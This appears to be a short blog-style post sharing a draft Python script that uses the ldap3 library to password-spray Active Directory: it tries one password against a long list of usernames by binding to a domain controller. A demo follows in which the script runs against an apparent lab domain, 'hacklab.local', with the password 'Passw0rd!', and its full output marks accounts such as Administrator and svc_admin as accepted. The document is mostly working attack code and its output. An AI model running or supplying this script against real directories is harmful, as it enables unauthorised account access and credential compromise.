These are draft scripts I’m just toying with.

**Domain credential stuffing script**

This script needs ldap3

```
pip install ldap3
```

```
import argparse
from ldap3 import Server, Connection, ALL, SUBTREE, core
from ldap3.core.exceptions import LDAPException

def authenticate(username, domain, password, domain_controller):
    user_dn = f"{username}@{domain}"
    server = Server(domain_controller, get_info=ALL)
    
    try:
        conn = Connection(server, user=user_dn, password=password, auto_bind=True)
        if conn.bind():
            return True
        else:
            return False
    except LDAPException:
        return False

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Authenticate and check AD users")
    parser.add_argument("-u", "--usernames", nargs="+", required=True, help="One or more usernames to check")
    parser.add_argument("-p", "--password", required=True, help="Password")
    parser.add_argument("-d", "--domain", required=True, help="Domain")
    parser.add_argument("-dc", "--domain_controller", required=True, help="Domain Controller Hostname")
    
    args = parser.parse_args()
    
    for username in args.usernames:
        if authenticate(username, args.domain, args.password, args.domain_controller):
            print(f"Accepted: {username}")
        else:
            print(f"Rejected: {username}")
```

**Demo sing the Domain credential stuffing script**

```
(Tools) ubuntu@ubuntu-virtual-machine:~/Documents/Tools$ python3 AD_Creds6.py -u Administrator Guest WIN-8HPLF8PSHC1$ krbtgt da1 n.collins o.davidson p.davies q.dawson u.dixon r.edwards s.elliot t.evans u.fisher v.fletcher w.ford x.foster y.fox z.gibson a.graham b.grant c.gray d.green b.smith c.johnason d.thomas e.miller f.johnsson g.williams t.harris i.jackson t.wilsson k.mmoore l.martsinez m.marjtinez n.anderson o.thompson p.thompson q.lewis r.robinson s.sancshez t.clark u.hernandez v.hill w.king x.rossi y.darrdvis z.perez a.white b.jackson c.smith d.taylor e.martin f.thoffmas g.hernandez h.rodrgviguez i.johncson j.miller k.jones l.davsris m.andessrson y.johnfson o.mooore p.clark q.thomdas r.martianez s.wiloson t.robinson u.marteinez v.sancahez w.moorre x.thompson y.martsinez z.hernandez a.miller b.rodriseguez c.anderson d.sancahez e.wilison f.davrtsis g.mooree h.thomddfas z.johnsson j.martainez k.rodrigfduez l.sanchdez m.clark n.davdemis o.wilwson p.robinson q.hernandez r.martiynez s.anderson t.johnsron u.rodrigkjuez v.sancghez w.wilsaon x.davifis y.moossre z.thomssas a.martinuez b.hernandez c.robinson d.clark e.jodhnson f.sanwchez g.wilpson h.davxris i.moofrre j.massrtainez k.rodrijguez l.sancahez m.anderson n.johnsson o.martiwnez p.hernandez q.wiloson r.davirws s.moewore t.thoweermas u.johnslon v.martienez w.rodrisguez x.sanchgez y.wilison z.davsdis a.clark b.johndson c.martiwnez d.rodrigruez e.sanchjez f.wilyson g.davioos h.mooeere i.thomas j.johnhson k.martiunez l.rodrigiuez m.sanychez n.wiwlson o.daviuus p.moorrre q.thdddomas r.johntson s.marttinez t.rodrieguez u.sancrhez v.wilsion w.davccis x.moowsxre y.thomeeeas z.johnqson a.martwinez b.rodrigutuez c.sanczhez d.wilsuion e.daerfvis f.mooure g.thomeeeas h.johnsson i.martinwez j.rodrwyiguez k.sanchiez l.wilyson m.davssis n.moorcre o.thomderas p.johnsson q.maratinez r.rodrieyguez s.sancyhez t.wilseon u.daytvis v.mocdore w.thomattts x.johnsaon y.martihnez z.rodrirtguez a.sanchtez b.wilswon c.davyis d.moodsre e.thomfffas f.johnso g.martinjez h.rodrigwuez i.sancohez j.wilesosn k.dawerris l.moouiyre m.thogghmas n.johseeson o.martidnez p.rodrasiguez q.sanchpez r.wilsson s.daveeris t.moodce u.thomhhas v.jhnson w.martfinez x.rodrifguez y.sancuhez z.wilsaon a.davihhuus b.mootfre c.thomhhsas d.johnsaon e.martidfnez f.rodridfguez g.sancthez h.wilzson i.davffis j.moodckre k.thomeweas l.johnon m.martiynez n.rodrsiguez o.sanrchez p.wiltson q.davfwfis r.mooyre m.jenkins n.johnson o.jones g.white h.yalden i.yarbury j.yardley z.mcdonald a.murphy b.natt c.nelson d.nightingale e.nixon f.nutter p.kelly q.kennedy u.king r.knight s.lawrence t.lee u.lewis v.lloyd w.marshall x.martin y.mason g.dell h.osborne i.owen j.oxley k.page l.painter m.palmer n.pastor o.peterson p.quill q.quimby u.quintrell r.ramsey s.ratliff t.richards u.roberts v.robinson w.scott x.simpson y.smith z.stewart a.taylor b.turner c.walsh d.ward e.webb f.west d.atkinson e.bailey f.baker g.ball h.bell i.brown j.burton k.carter l.clarke m.cole e.griffiths f.hall g.hamilton h.harris i.harvey j.hill k.jackson l.james k.yarrow l.yates m.young n.zachary o.zelly p.zinc q.zouch a.adams b.allen c.armstrong adm.adams adm.smith adm.stewart adm.natt adm.nelson svc_afds svc_test svc_mssql1 svc_mssql2 svc_lab svc_admin SR2000-1$ SR2000-2$ SR2000-3$ SR2000-4$ SR2000-5$ SR2000-6$ SR2003-1$ SR2003-2$ SR2003-3$ SR2003-4$ SR2003-5$ SR2003-6$ SR208-1$ SR208-2$ SR208-3$ SR208-4$ SR208-5$ SR208-6$ SR2012-1$ SR2012-2$ SR2012-3$ SR2012-4$ SR2019-1$ SR2019-2$ SR2019-3$ SR2019-4$ W7-1$ W7-2$ W7-3$ W7-4$ W7-5$ W7-6$ XP-1$ WIN-10-LAB$ WIN-10-LAB-2$ Tom_ADM kay1 -p 'Passw0rd!' -d hacklab.local -dc 192.168.68.230
Accepted: Administrator
Rejected: Guest
Rejected: WIN-8HPLF8PSHC1$
Rejected: krbtgt
Accepted: da1
Accepted: n.collins
Accepted: o.davidson
Accepted: p.davies
Accepted: q.dawson
Accepted: u.dixon
Accepted: r.edwards
Accepted: s.elliot
Accepted: t.evans
Accepted: u.fisher
Accepted: v.fletcher
Accepted: w.ford
Accepted: x.foster
Accepted: y.fox
Accepted: z.gibson
Accepted: a.graham
Accepted: b.grant
Accepted: c.gray
Accepted: d.green
Rejected: b.smith
Rejected: c.johnason
Rejected: d.thomas
Rejected: e.miller
Rejected: f.johnsson
Rejected: g.williams
Rejected: t.harris
Rejected: i.jackson
Rejected: t.wilsson
Rejected: k.mmoore
Rejected: l.martsinez
Rejected: m.marjtinez
Rejected: n.anderson
Rejected: o.thompson
Rejected: p.thompson
Rejected: q.lewis
Rejected: r.robinson
Rejected: s.sancshez
Rejected: t.clark
Rejected: u.hernandez
Rejected: v.hill
Rejected: w.king
Rejected: x.rossi
Rejected: y.darrdvis
Rejected: z.perez
Rejected: a.white
Rejected: b.jackson
Rejected: c.smith
Rejected: d.taylor
Rejected: e.martin
Rejected: f.thoffmas
Rejected: g.hernandez
Rejected: h.rodrgviguez
Rejected: i.johncson
Rejected: j.miller
Rejected: k.jones
Rejected: l.davsris
Rejected: m.andessrson
Rejected: y.johnfson
Rejected: o.mooore
Rejected: p.clark
Rejected: q.thomdas
Rejected: r.martianez
Rejected: s.wiloson
Rejected: t.robinson
Rejected: u.marteinez
Rejected: v.sancahez
Rejected: w.moorre
Rejected: x.thompson
Rejected: y.martsinez
Rejected: z.hernandez
Rejected: a.miller
Rejected: b.rodriseguez
Rejected: c.anderson
Rejected: d.sancahez
Rejected: e.wilison
Rejected: f.davrtsis
Rejected: g.mooree
Rejected: h.thomddfas
Rejected: z.johnsson
Rejected: j.martainez
Rejected: k.rodrigfduez
Rejected: l.sanchdez
Rejected: m.clark
Rejected: n.davdemis
Rejected: o.wilwson
Rejected: p.robinson
Rejected: q.hernandez
Rejected: r.martiynez
Rejected: s.anderson
Rejected: t.johnsron
Rejected: u.rodrigkjuez
Rejected: v.sancghez
Rejected: w.wilsaon
Rejected: x.davifis
Rejected: y.moossre
Rejected: z.thomssas
Rejected: a.martinuez
Rejected: b.hernandez
Rejected: c.robinson
Rejected: d.clark
Rejected: e.jodhnson
Rejected: f.sanwchez
Rejected: g.wilpson
Rejected: h.davxris
Rejected: i.moofrre
Rejected: j.massrtainez
Rejected: k.rodrijguez
Rejected: l.sancahez
Rejected: m.anderson
Rejected: n.johnsson
Rejected: o.martiwnez
Rejected: p.hernandez
Rejected: q.wiloson
Rejected: r.davirws
Rejected: s.moewore
Rejected: t.thoweermas
Rejected: u.johnslon
Rejected: v.martienez
Rejected: w.rodrisguez
Rejected: x.sanchgez
Rejected: y.wilison
Rejected: z.davsdis
Rejected: a.clark
Rejected: b.johndson
Rejected: c.martiwnez
Rejected: d.rodrigruez
Rejected: e.sanchjez
Rejected: f.wilyson
Rejected: g.davioos
Rejected: h.mooeere
Rejected: i.thomas
Rejected: j.johnhson
Rejected: k.martiunez
Rejected: l.rodrigiuez
Rejected: m.sanychez
Rejected: n.wiwlson
Rejected: o.daviuus
Rejected: p.moorrre
Rejected: q.thdddomas
Rejected: r.johntson
Rejected: s.marttinez
Rejected: t.rodrieguez
Rejected: u.sancrhez
Rejected: v.wilsion
Rejected: w.davccis
Rejected: x.moowsxre
Rejected: y.thomeeeas
Rejected: z.johnqson
Rejected: a.martwinez
Rejected: b.rodrigutuez
Rejected: c.sanczhez
Rejected: d.wilsuion
Rejected: e.daerfvis
Rejected: f.mooure
Rejected: g.thomeeeas
Rejected: h.johnsson
Rejected: i.martinwez
Rejected: j.rodrwyiguez
Rejected: k.sanchiez
Rejected: l.wilyson
Rejected: m.davssis
Rejected: n.moorcre
Rejected: o.thomderas
Rejected: p.johnsson
Rejected: q.maratinez
Rejected: r.rodrieyguez
Rejected: s.sancyhez
Rejected: t.wilseon
Rejected: u.daytvis
Rejected: v.mocdore
Rejected: w.thomattts
Rejected: x.johnsaon
Rejected: y.martihnez
Rejected: z.rodrirtguez
Rejected: a.sanchtez
Rejected: b.wilswon
Rejected: c.davyis
Rejected: d.moodsre
Rejected: e.thomfffas
Rejected: f.johnso
Rejected: g.martinjez
Rejected: h.rodrigwuez
Rejected: i.sancohez
Rejected: j.wilesosn
Rejected: k.dawerris
Rejected: l.moouiyre
Rejected: m.thogghmas
Rejected: n.johseeson
Rejected: o.martidnez
Rejected: p.rodrasiguez
Rejected: q.sanchpez
Rejected: r.wilsson
Rejected: s.daveeris
Rejected: t.moodce
Rejected: u.thomhhas
Rejected: v.jhnson
Rejected: w.martfinez
Rejected: x.rodrifguez
Rejected: y.sancuhez
Rejected: z.wilsaon
Rejected: a.davihhuus
Rejected: b.mootfre
Rejected: c.thomhhsas
Rejected: d.johnsaon
Rejected: e.martidfnez
Rejected: f.rodridfguez
Rejected: g.sancthez
Rejected: h.wilzson
Rejected: i.davffis
Rejected: j.moodckre
Rejected: k.thomeweas
Accepted: l.johnon
Rejected: m.martiynez
Rejected: n.rodrsiguez
Rejected: o.sanrchez
Rejected: p.wiltson
Rejected: q.davfwfis
Rejected: r.mooyre
Rejected: m.jenkins
Rejected: n.johnson
Rejected: o.jones
Accepted: g.white
Rejected: h.yalden
Rejected: i.yarbury
Rejected: j.yardley
Rejected: z.mcdonald
Rejected: a.murphy
Rejected: b.natt
Rejected: c.nelson
Rejected: d.nightingale
Rejected: e.nixon
Rejected: f.nutter
Rejected: p.kelly
Rejected: q.kennedy
Rejected: u.king
Rejected: r.knight
Rejected: s.lawrence
Rejected: t.lee
Rejected: u.lewis
Rejected: v.lloyd
Rejected: w.marshall
Rejected: x.martin
Rejected: y.mason
Rejected: g.dell
Rejected: h.osborne
Rejected: i.owen
Rejected: j.oxley
Rejected: k.page
Rejected: l.painter
Rejected: m.palmer
Rejected: n.pastor
Rejected: o.peterson
Rejected: p.quill
Rejected: q.quimby
Rejected: u.quintrell
Rejected: r.ramsey
Rejected: s.ratliff
Rejected: t.richards
Rejected: u.roberts
Rejected: v.robinson
Rejected: w.scott
Rejected: x.simpson
Rejected: y.smith
Rejected: z.stewart
Rejected: a.taylor
Rejected: b.turner
Rejected: c.walsh
Rejected: d.ward
Rejected: e.webb
Rejected: f.west
Rejected: d.atkinson
Rejected: e.bailey
Rejected: f.baker
Rejected: g.ball
Rejected: h.bell
Rejected: i.brown
Rejected: j.burton
Rejected: k.carter
Rejected: l.clarke
Rejected: m.cole
Rejected: e.griffiths
Rejected: f.hall
Rejected: g.hamilton
Rejected: h.harris
Rejected: i.harvey
Rejected: j.hill
Rejected: k.jackson
Rejected: l.james
Rejected: k.yarrow
Rejected: l.yates
Rejected: m.young
Rejected: n.zachary
Rejected: o.zelly
Rejected: p.zinc
Rejected: q.zouch
Rejected: a.adams
Accepted: b.allen
Rejected: c.armstrong
Rejected: adm.adams
Rejected: adm.smith
Rejected: adm.stewart
Rejected: adm.natt
Rejected: adm.nelson
Rejected: svc_afds
Rejected: svc_test
Rejected: svc_mssql1
Rejected: svc_mssql2
Rejected: svc_lab
Accepted: svc_admin
Rejected: SR2000-1$
Rejected: SR2000-2$
Rejected: SR2000-3$
Rejected: SR2000-4$
Rejected: SR2000-5$
Rejected: SR2000-6$
Rejected: SR2003-1$
Rejected: SR2003-2$
Rejected: SR2003-3$
Rejected: SR2003-4$
Rejected: SR2003-5$
Rejected: SR2003-6$
Rejected: SR208-1$
Rejected: SR208-2$
Rejected: SR208-3$
Rejected: SR208-4$
Rejected: SR208-5$
Rejected: SR208-6$
Rejected: SR2012-1$
Rejected: SR2012-2$
Rejected: SR2012-3$
Rejected: SR2012-4$
Rejected: SR2019-1$
Rejected: SR2019-2$
Rejected: SR2019-3$
Rejected: SR2019-4$
Rejected: W7-1$
Rejected: W7-2$
Rejected: W7-3$
Rejected: W7-4$
Rejected: W7-5$
Rejected: W7-6$
Rejected: XP-1$
Rejected: WIN-10-LAB$
Rejected: WIN-10-LAB-2$
Rejected: Tom_ADM
Accepted: kay1
(Tools) ubuntu@ubuntu-virtual-machine:~/Documents/Tools$ 
```

